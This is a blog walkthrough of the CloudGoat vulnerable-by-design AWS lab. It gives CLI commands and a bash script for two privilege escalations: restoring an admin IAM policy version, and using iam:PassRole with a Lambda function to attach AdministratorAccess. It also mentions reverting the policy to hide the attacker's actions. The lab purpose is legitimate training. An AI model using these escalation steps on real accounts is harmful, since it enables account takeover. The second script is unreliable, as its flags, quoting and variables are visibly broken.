<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Lab - CloudGoat [Level 1 - Level 8]" /><meta property="og:locale" content="en" /><meta name="description" content="[toc]" /><meta property="og:description" content="[toc]" /><link rel="canonical" href="https://ocholuo.github.io//posts/CloudGoat/" /><meta property="og:url" content="https://ocholuo.github.io//posts/CloudGoat/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-24T10:11:11-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Lab - CloudGoat [Level 1 - Level 8]" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-02T18:35:09-05:00","datePublished":"2021-01-24T10:11:11-05:00","description":"[toc]","headline":"Lab - CloudGoat [Level 1 - Level 8]","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/CloudGoat/"},"url":"https://ocholuo.github.io//posts/CloudGoat/"}</script><title>Lab - CloudGoat [Level 1 - Level 8] | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/huoye.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2023 Mar 14 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Lab - CloudGoat [Level 1 - Level 8]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Lab - CloudGoat [Level 1 - Level 8]</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 24, 2021, 10:11 AM -0500" >Jan 24, 2021<i class="unloaded">2021-01-24T10:11:11-05:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Jan 2, 2023, 3:35 PM -0800" >Jan 2<i class="unloaded">2023-01-02T18:35:09-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="7591 words">42 min read</span> <span id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </span> views</div></div><div class="post-content"><p>[toc]</p><hr /><h1 id="cloudgoat-Ô∏è">CloudGoat (‚òÅÔ∏èüêê)</h1><p><em>CloudGoat is Rhino Security Labs‚Äô ‚ÄúVulnerable by Design‚Äù AWS deployment tool.</em></p><p align="center"> <img data-proofer-ignore data-src="https://rhinosecuritylabs.com/wp-content/uploads/2018/07/cloudgoat-e1533043938802-1140x400.jpg" width="350" /></p><blockquote><p>CloudGoat is Rhino Security Labs‚Äô ‚ÄúVulnerable by Design‚Äù AWS deployment tool. It allows you to hone your cloud cybersecurity skills by creating and completing several ‚Äúcapture-the-flag‚Äù style scenarios. Each scenario is composed of AWS resources arranged together to create a structured learning experience.</p></blockquote><p>Before proceed</p><blockquote><p><strong>Warning #1:</strong> CloudGoat creates intentionally vulnerable AWS resources into your account. DO NOT deploy CloudGoat in a production environment or alongside any sensitive AWS resources. <strong>Warning #2:</strong> CloudGoat can only manage resources it creates. If you create any resources yourself in the course of a scenario, you should remove them manually before running the <code class="language-plaintext highlighter-rouge">destroy</code> command.</p></blockquote><hr /><h2 id="requirements">Requirements</h2><ul><li>Linux or MacOS. Windows is not officially supported.<ul><li>Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).</ul><li>Python3.6+ is required.<li><p>Terraform 0.12 <a href="https://learn.hashicorp.com/terraform/getting-started/install.html">installed and in your $PATH</a>.</p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>  brew tap hashicorp/tap
  brew <span class="nb">install </span>hashicorp/tap/terraform
  brew upgrade hashicorp/tap/terraform
  terraform <span class="nt">-install-autocomplete</span>
</pre></table></code></div></div><li>The AWS CLI <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html">installed and in your $PATH</a>, and an AWS account with sufficient privileges to create and destroy resources.</ul><hr /><h2 id="install">install</h2><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
<span class="nv">$ </span><span class="nb">cd </span>cloudGoat
<span class="nv">$ </span>pip3 <span class="nb">install</span> <span class="nt">-r</span> ./core/python/requirements.txt
<span class="nv">$ </span><span class="nb">chmod </span>u+x cloudgoat.py

<span class="c"># run some quick configuration commands</span>
<span class="nv">$ </span>./cloudgoat.py config profile
<span class="nv">$ </span>./cloudgoat.py config whitelist <span class="nt">--auto</span>
</pre></table></code></div></div><p>Now, at your command, CloudGoat can <code class="language-plaintext highlighter-rouge">create</code> an instance of a scenario in the cloud.</p><ul><li>When the environment is ready, a new folder will be created in the project base directory named after the scenario and with a unique scenario ID appended.<li>Inside this folder will be a file called <code class="language-plaintext highlighter-rouge">start.txt</code>, which will contain all of the resources you‚Äôll need to begin the scenario, though these are also printed to your console when the <code class="language-plaintext highlighter-rouge">create</code> command completes.<li>Sometimes an SSH keypair named <code class="language-plaintext highlighter-rouge">cloudgoat</code>/<code class="language-plaintext highlighter-rouge">cloudgoat.pub</code> will be created as well.</ul><p>When you are finished with the scenario</p><ul><li>delete any resources you created yourself (remember: CloudGoat can only manage resources it creates)<li>then run the <code class="language-plaintext highlighter-rouge">destroy</code> command.<li>take a quick glance at AWS web-console afterwards - in case something didn‚Äôt get deleted.</ul><p>You can read the full documentation for CloudGoat‚Äôs commands [here in the Usage Guide section].</p><hr /><h2 id="use-cloudgoats-docker-image">use CloudGoat‚Äôs Docker image</h2><p><a href="http://play-with-docker.com?stack=https://raw.githubusercontent.com/RhinoSecurityLabs/cloudgoat/master/docker_stack.yml"><img data-proofer-ignore data-src="https://github.com/play-with-docker/stacks/raw/cff22438cb4195ace27f9b15784bbb497047afa7/assets/images/button.png" alt="Try in PWD" /></a></p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># Option 1: Run with default entrypoint</span>
<span class="nv">$ </span>docker run <span class="nt">-it</span> rhinosecuritylabs/cloudgoat:latest

<span class="c"># Option 2: Run with AWS config and credentials</span>
<span class="nv">$ </span>docker run <span class="nt">-it</span> <span class="nt">-v</span> ~/.aws:/root/.aws/ rhinosecuritylabs/cloudgoat:latest
<span class="c"># Running this command will mount your local AWS configuration files into the Docker container when it is launched.</span>
<span class="c"># any user with access to the container will have access to the host computers AWS credentials.</span>
</pre></table></code></div></div><hr /><h2 id="scenarios-available">Scenarios Available</h2><hr /><h3 id="scenarios-1-iam_privesc_by_rollback-small--easy">Scenarios 1: iam_privesc_by_rollback (Small / Easy)</h3><div class="table-wrapper"><table><thead><tr><th>++<th>++<tbody><tr><td>Scenario Goal<td>Acquire full admin privileges.<tr><td>Size<td>Small<tr><td>Difficulty<td>Easy<tr><td>Command<td><code class="language-plaintext highlighter-rouge">$ ./cloudgoat.py create iam_privesc_by_rollback</code><tr><td>lesson learned<td><font color="red"> iam:SetDefaultPolicyVersion </font> can lead to serious security issues, user can roll-back to any version, If any of these versions have additional permissions, then it is a privilege escalation and the severity depends on the additional permissions.</table></div><p><img data-proofer-ignore data-src="https://i.imgur.com/8MZEA2V.png" alt="68747" /></p><p>Starting with a highly-limited IAM user,</p><ul><li>the attacker is able to review previous IAM policy versions<li>and restore one which allows full admin privileges,<li>resulting in a privilege escalation exploit.</ul><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre><td class="rouge-code"><pre><span class="c"># ------------- 1. have a set of AWS credentials</span>
<span class="c"># create a named profile with the security credentials using AWS CLI.</span>
aws configure <span class="se">\</span>
    <span class="nt">--profile</span> raynor


<span class="c"># ------------- 2. identity who the security credentials belong to</span>
<span class="c"># got the userId, account, Arn(accountID+IAMusername)</span>
aws sts get-caller-identity <span class="se">\</span>
    <span class="nt">--profile</span> raynor


<span class="c"># ------------- 3. enumerate the permissions of the services in the AWS account.</span>
<span class="c"># Scout Suite, enumerate-iam etc.</span>
<span class="c"># - brute force AWS API calls</span>
<span class="c"># - to determine which API calls are allowed for a given set of security credentials.</span>



<span class="c"># ------------- 3. enumerate Inline Policies and Managed Policies of IAM user "Raynor"</span>
<span class="c"># When evaluating security of an IAM identity (users, groups of users, or roles), enumerating policies and permissions is an essential step.</span>

<span class="c"># analyzes Raynor's privileges</span>
<span class="c"># got the policyARN</span>
<span class="c"># A "Customer Managed Policy" cg-raynor-policy is attached directly to the IAM user "Raynor".</span>
aws iam list-attached-user-policies <span class="se">\</span>
    <span class="nt">--user-name</span> raynor <span class="se">\</span>
    <span class="nt">--profile</span> raynor

<span class="c"># enumerate the customer managed policy "cg-raynor-policy "</span>
<span class="c"># --only-attached : extract only attached policies and "scope" as Local to only extract customer managed policies.</span>
<span class="c"># -query : extract only information related to cg-raynor-policy.</span>
<span class="c"># Notice that the default version is v1.</span>
aws iam list-policies <span class="se">\</span>
    <span class="nt">--only-attached</span> <span class="nt">--scope</span> Local <span class="se">\</span>
    <span class="nt">--query</span> <span class="s2">"Policies[?starts_with(PolicyName, 'cg')]"</span> <span class="se">\</span>
    <span class="nt">--profile</span> scenario1



<span class="c"># ------------- 4. reviewing the old versions policy</span>
aws iam get-policy-version <span class="se">\</span>
    <span class="nt">--policy-arn</span> &lt;generatedARN&gt;/cg-raynor-policy <span class="se">\</span>
    <span class="nt">--version-id</span> &lt;versionID&gt; <span class="se">\</span>
    <span class="nt">--profile</span> raynor
<span class="c"># one version offers a full set of admin rights.</span>
<span class="c"># the IAM identity with the policy is allowed to</span>
<span class="c"># - perform any IAM "Get" or "List" operations against any resource.</span>
<span class="c"># - one "Set" operation, iam:SetDefaultPolicyVersion, is allowed against any resource.</span>
<span class="c"># iam:SetDefaultPolicyVersion is allowed can lead to serious security issues.</span>



<span class="c"># ------------- 5. review previous IAM policy versions</span>
<span class="c"># check if there are other versions of the customer managed policy cg-raynor-policy.</span>
<span class="c"># there can be up to 5 versions of the policy.</span>
aws iam list-policy-versions <span class="se">\</span>
    <span class="nt">--policy-arn</span> &lt;generatedARN&gt;/cg-raynor-policy <span class="se">\</span>
    <span class="nt">--profile</span> raynor


aws iam get-policy-version <span class="se">\</span>
    <span class="nt">--policy-arn</span> &lt;generatedARN&gt;/cg-raynor-policy <span class="se">\</span>
    <span class="nt">--version-id</span> &lt;versionID&gt; <span class="se">\</span>
    <span class="nt">--profile</span> raynor


<span class="c"># restore the one which allows full admin privileges,</span>
aws iam set-default-policy-version <span class="se">\</span>
    <span class="nt">--policy-arn</span> &lt;generatedARN&gt;/cg-raynor-policy <span class="se">\</span>
    <span class="nt">--version-id</span> v5 <span class="se">\</span>
    <span class="nt">--profile</span> raynor


<span class="c"># As a final step, may choose to revert Raynor's policy version back to the original one,</span>
<span class="c"># thereby concealing the actions and the true capabilities of the IAM user.</span>

<span class="c"># Destroy the scenario resources</span>
python3 cloudgoat.py destroy iam_privesc_by_rollback
</pre></table></code></div></div><hr /><h3 id="scenarios-2-lambda_privesc-small--easy">Scenarios 2: lambda_privesc (Small / Easy)</h3><div class="table-wrapper"><table><thead><tr><th>++<th>++<tbody><tr><td>Scenario Goal<td>Acquire full admin privileges.<tr><td>Size<td>Small<tr><td>Difficulty<td>Easy<tr><td>Command<td><code class="language-plaintext highlighter-rouge">$ ./cloudgoat.py create lambda_privesc</code><tr><td>lesson learned<td><font color="red"> sts:AssumeRole + Lambda:* </font> able to change the assume role policy document of any existing role to allow them to assume that role. It returns a set of temporary security credentials that you can use to access AWS resources that you might not normally have access to.</table></div><p><img data-proofer-ignore data-src="https://i.imgur.com/iam6d77.png" alt="68747470733a2f2f6170702e6c7563696463686172742e636f6d2f7075626c69635365676d656e74732f766965772f66316237613734392d646565302d343634352d623330352d6164643261303235623963632f696d6167652e706e67" /></p><p>Starting as the IAM user Chris</p><ul><li>discovers that they can assume a role that has full Lambda access and pass role permissions.<li>then perform privilege escalation using these new permissions to obtain full admin privileges.</ul><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># A python2 utility ‚Äúcrudini‚Äù</span>
pip2 <span class="nb">install</span> ‚Äî user crudini
<span class="c"># jq ‚Äî awesome json processor</span>
brew <span class="nb">install </span>jq


<span class="c">#set command line parameters</span>
<span class="nv">INFILE</span><span class="o">=</span>~/.aws/credentials

<span class="nv">SRC_PROFILE</span><span class="o">=</span><span class="s1">'chris'</span>
<span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="nv">$1</span>
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="nv">$2</span>
<span class="nv">AWS_REGION</span><span class="o">=</span><span class="s1">'us-east-1'</span>

<span class="c"># ------------- 1. Deploying the resources gives us the access key and secret key for Chris:</span>


<span class="c"># ------------- 2. create a profile with the security credentials using AWS CLI.</span>
<span class="c"># aws configure \</span>
<span class="c">#     --profile $SRC_PROFILE</span>
<span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$SRC_PROFILE</span><span class="s2">]
REGION = </span><span class="nv">$AWS_REGION</span><span class="s2">
AWS_ACCESS_KEY_ID = </span><span class="nv">$AWS_ACCESS_KEY_ID</span><span class="s2">
AWS_SECRET_ACCESS_KEY = </span><span class="nv">$AWS_SECRET_ACCESS_KEY</span><span class="s2">
"</span> | crudini <span class="nt">--merge</span> <span class="nv">$INFILE</span>
<span class="nb">echo</span> <span class="s2">"Set creds for profile </span><span class="nv">$PROFILE</span><span class="s2"> in </span><span class="nv">$INFILE</span><span class="s2">"</span>


<span class="c"># got the userId, account, Arn(accountID+IAMusername)</span>
<span class="c"># aws sts get-caller-identity \</span>
<span class="c">#     --profile $SRC_PROFILE</span>
<span class="nv">IDENTITY</span><span class="o">=</span><span class="sb">`</span>aws iam get-user <span class="se">\</span>
			<span class="nt">--profile</span> <span class="nv">$PROFILE</span><span class="sb">`</span>
<span class="nv">USERNAME</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$IDENTITY</span> | jq <span class="nt">-r</span> .UserName<span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"-------profile </span><span class="nv">$PROFILE</span><span class="s2"> 's user name is </span><span class="nv">$USERNAME</span><span class="s2">"</span>



<span class="c"># ------------- 3. Enumerate the policies and permissions attached</span>
<span class="c"># Lists inline policies</span>
<span class="nv">InPolicy</span><span class="o">=</span><span class="s1">'aws iam list-user-policies \
            ‚Äì-user-name $USERNAME \
            ‚Äì-profile $SRC_PROFILE '</span>
<span class="c"># Lists managed policies</span>
<span class="nv">AWSPolicy</span><span class="o">=</span><span class="s1">'aws iam list-attached-user-policies \
            ‚Äì-user-name $USERNAME \
            ‚Äì-profile $SRC_PROFILE'</span>
<span class="nv">AWSPolicyArn</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$AWSPolicy</span> | jq <span class="nt">-r</span> .AttachedPolicies[].PolicyArn<span class="sb">`</span>



<span class="c"># ------------- 4. Get info on the managed policy</span>
<span class="c"># get version</span>
<span class="nv">AWSPolicyInfo</span><span class="o">=</span><span class="s1">'aws iam get-policy \
                -‚Äìpolicy-arn $AWSPolicyArn \
                -‚Äìprofile $SRC_PROFILE '</span>
<span class="nv">AWSPolicyVer</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$AWSPolicy</span> | jq <span class="nt">-r</span> .Policy.DefaultVersionId<span class="sb">`</span>


<span class="c"># Review details of the policy</span>
aws iam get-policy-version <span class="se">\</span>
    -‚Äìpolicy-arn <span class="nv">$AWSPolicyArn</span> <span class="se">\</span>
    -‚Äìversion-id <span class="nv">$AWSPolicyVer</span> <span class="se">\</span>
    -‚Äìprofile <span class="nv">$SRC_PROFILE</span>
<span class="c"># this policy has sts:AssumeRole allowed</span>




<span class="c"># ------------- 5. Get nformation about the roles:</span>
<span class="c"># Review details of the policy attached</span>
<span class="c"># two roles assigned to the user: ‚Äúcg-debug-role-cgidpqw7rhl92u‚Äù and ‚Äúcg-lambdaManager-role-cgidpqw7rhl92u‚Äù.</span>
<span class="nv">IAMRolesInfo</span><span class="o">=</span><span class="s1">'aws iam list-roles \
            -‚Äìprofile $SRC_PROFILE'</span>
<span class="nv">AWSRoleName</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$IAMRolesInfo</span> | jq <span class="nt">-r</span> .Roles[.RoleName]<span class="sb">`</span>

<span class="nv">DebugRole</span><span class="o">=</span><span class="s1">'cg-debug-role-cgidpqw7rhl92u'</span>
<span class="nv">LambdaRole</span><span class="o">=</span><span class="s1">'cg-lambdaManager-role-cgidpqw7rhl92u'</span>


<span class="nv">DebugRolePolicy</span><span class="o">=</span><span class="s1">'aws iam list-attached-role-policies \
                    ‚Äì-role-name $DebugRole
                    -‚Äìprofile $SRC_PROFILE'</span>
<span class="nv">DebugRolePolicyArn</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$DebugRolePolicy</span> | jq <span class="nt">-r</span> .AttachedPolicies[].PolicyArn<span class="sb">`</span>
<span class="c"># The DebugRole role has AdministratorAccess policy</span>
aws sts assume role <span class="se">\</span>
    -‚Äìrole-arn <span class="nv">$DebugRolePolicyArn</span>
    ‚Äì-role-session-name debug_role_session
    -‚Äìprofile <span class="nv">$SRC_PROFILE</span>
<span class="c"># assume the debug role</span>
<span class="c"># access is denied because Chris is not authorized to assume the role.</span>


<span class="nv">LambdaRolePolicy</span><span class="o">=</span><span class="s1">'aws iam list-attached-role-policies \
                    ‚Äì-role-name $LambdaRole
                    -‚Äìprofile $SRC_PROFILE'</span>
<span class="nv">LambdaRolePolicyArn</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$LambdaRolePolicy</span> | jq <span class="nt">-r</span> .AttachedPolicies[].PolicyArn<span class="sb">`</span>
<span class="c"># The LambdaRole role has lambdaManager policy</span>
<span class="c"># Get more information on the managed policy attached to the IAM role:</span>
<span class="nv">LambdaRolePolicyInfo</span><span class="o">=</span><span class="s1">'aws iam get-policy \
                        -‚Äìpolicy-arn $LambdaRolePolicyArn \
                        -‚Äìprofile $SRC_PROFILE'</span>
<span class="nv">LambdaRolePolicyVer</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$LambdaRolePolicyInfo</span> | jq <span class="nt">-r</span> .Policy.DefaultVersionId<span class="sb">`</span>

<span class="nv">LambdaRolePolicy</span><span class="o">=</span><span class="s1">'aws iam get-policy-version \
                    -‚Äìpolicy-arn $LambdaRolePolicyArn \
                    -‚Äìversion-id $LambdaRolePolicyVer \
                    -‚Äìprofile $SRC_PROFILE '</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$LambdaRolePolicy</span><span class="s2">"</span>
<span class="c"># this policy has iam:PassRole, lambda:CreateFunction and lambda:InvokeFunction permissions</span>
<span class="c"># can escalate privileges by passing an existing IAM role to new Lambda function that includes code</span>
<span class="c"># - to import the relevant AWS library to their programming language of choice,</span>
<span class="c"># - then using it perform actions of their choice.</span>
<span class="c"># The code could then be run by invoking the function through the AWS API.</span>
<span class="c"># This would give a user access to the privileges associated with any Lambda service role that exists in the account, from no privilege escalation to full administrator access to the account.</span>


<span class="nv">LambdaRoleSession</span><span class="o">=</span><span class="s1">'aws sts assume role \
                    -‚Äìrole-arn $LambdaRole
                    ‚Äì-role-session-name lambdaManager_role_session
                    -‚Äìprofile $SRC_PROFILE'</span>
<span class="c"># assume the lambdaManager role</span>
<span class="c"># action was successful because Chris is authorized to assume the role.</span>
<span class="c"># granted the temporary credential of the role (i.e., access key ID, secret access key and session token).</span>





<span class="c"># ------------- 6. Configure the IAM credential on AWS CLI:</span>
<span class="c"># aws configure -‚Äìprofile lambdaManager</span>
<span class="nv">LambdaROFILE</span><span class="o">=</span><span class="s1">'lambdaManager'</span>
<span class="nv">LambdaRole_AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$LambdaRoleSession</span> | jq <span class="nt">-r</span> .Credentials.AccessKeyId<span class="sb">`</span>
<span class="nv">LambdaRole_AWS_AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$LambdaRoleSession</span> | jq <span class="nt">-r</span> .Credentials.SecretAccessKey<span class="sb">`</span>
<span class="nv">LambdaRole_AWS_SESSION_TOKEN</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$LambdaRoleSession</span> | jq <span class="nt">-r</span> .Credentials.SessionToken<span class="sb">`</span>

<span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$LambdaROFILE</span><span class="s2">]
REGION = </span><span class="nv">$AWS_REGION</span><span class="s2">
AWS_ACCESS_KEY_ID = </span><span class="nv">$LambdaRole_AWS_ACCESS_KEY_ID</span><span class="s2">
AWS_SECRET_ACCESS_KEY = </span><span class="nv">$LambdaRole_AWS_AWS_SECRET_ACCESS_KEY</span><span class="s2">
AWS_SESSION_TOKEN = </span><span class="nv">$LambdaRole_AWS_SESSION_TOKEN</span><span class="s2">
"</span> | crudini <span class="nt">--merge</span> <span class="nv">$INFILE</span>
<span class="nb">echo</span> <span class="s2">"Set creds for profile </span><span class="nv">$PROFILE</span><span class="s2"> in </span><span class="nv">$INFILE</span><span class="s2">"</span>


<span class="c"># ------------- 7. Create a Lambda function</span>
<span class="c"># Lambda: attach the administrator policy to the IAM user ‚Äì Chris:</span>
import boto3
def lambda_handler<span class="o">(</span>event, context<span class="o">)</span>:
    client <span class="o">=</span> boto3.client<span class="o">(</span><span class="s1">'iam'</span><span class="o">)</span>
    response <span class="o">=</span> client.attach_user_policy<span class="o">(</span>UserName <span class="o">=</span><span class="s1">'$USERNAME'</span>, <span class="nv">PolicyArn</span><span class="o">=</span><span class="s1">'arn:aws:iam::aws:policy/AdministratorAccess'</span><span class="o">)</span>
    <span class="k">return </span>response
<span class="c"># Save the file as lamba_function.py and zip it.</span>


<span class="c"># Run this command:</span>
<span class="c"># using the lambdaManager role to create a Lambda function, and set the lambda execution role to the debug role.</span>
aws lambda create-function <span class="se">\</span>
    -‚Äìfunction-name admin_function <span class="se">\</span>
    -‚Äìruntime python 3.6 <span class="se">\</span>
    -‚Äìrole <span class="nv">$DebugRolePolicyArn</span> <span class="se">\</span>
    -‚Äìhandler lambda_function.lambda.handler ‚Äìzip-file fileb://lamba_function.zip <span class="se">\</span>
    -‚Äìprofile <span class="nv">$LambdaROFILE</span> <span class="se">\</span>
    -‚Äîregion <span class="nv">$AWS_REGION</span>

<span class="c"># Invoke the Lambda function created. If successful, it will return a status code of 200.</span>
aws lambda invoke <span class="se">\</span>
    -‚Äìfunction-name admin_function output.txt <span class="se">\</span>
    -‚Äìprofile <span class="nv">$LambdaROFILE</span> <span class="se">\</span>
    -‚Äîregion <span class="nv">$AWS_REGION</span>


<span class="c"># ------------- 8. Confirm if the IAM user ‚Äì Chris has the new role attached to his profile:</span>
aws iam list-attached-user-policies <span class="se">\</span>
    ‚Äì-user-name <span class="nv">$USERNAME</span> <span class="se">\</span>
    -‚Äìprofile <span class="nv">$SRC_PROFILE</span>


